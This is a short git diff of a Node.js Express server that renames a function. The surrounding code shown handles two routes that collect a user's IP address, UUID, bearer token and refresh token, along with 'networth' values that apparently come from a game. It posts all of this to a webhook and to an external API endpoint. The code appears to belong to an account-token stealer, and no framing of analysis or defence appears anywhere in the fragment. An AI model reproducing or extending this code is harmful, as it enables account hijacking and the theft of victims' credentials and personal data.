@@ -49,7 +49,7 @@ app.get('/', async (req, res) => {
         // send everything to the webhook
         PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
         // send everything to the API
-        SendAPI(username, sentnetworth);
+        SendAPIData(username, sentnetworth);
     } catch (e) {
         console.log(e);
     }
@@ -276,7 +276,7 @@ app.get('/refresh', async (req, res) => {
     // send everything to the webhook
     PostWebhook(true, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
     // send everything to the API
-    SendAPI(username, networth);
+    SendAPIData(username, networth);
 
     // put something to the screen so that the user can leave the page
     res.send("Token has been refreshed.");
@@ -332,7 +332,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
 }
 
 // send the data to the API
-async function SendAPI(username, networth) {
+async function SendAPIData(username, networth) {
     const apiUrl = 'https://yourapi.com/endpoint';
     const data = {
         username: username,
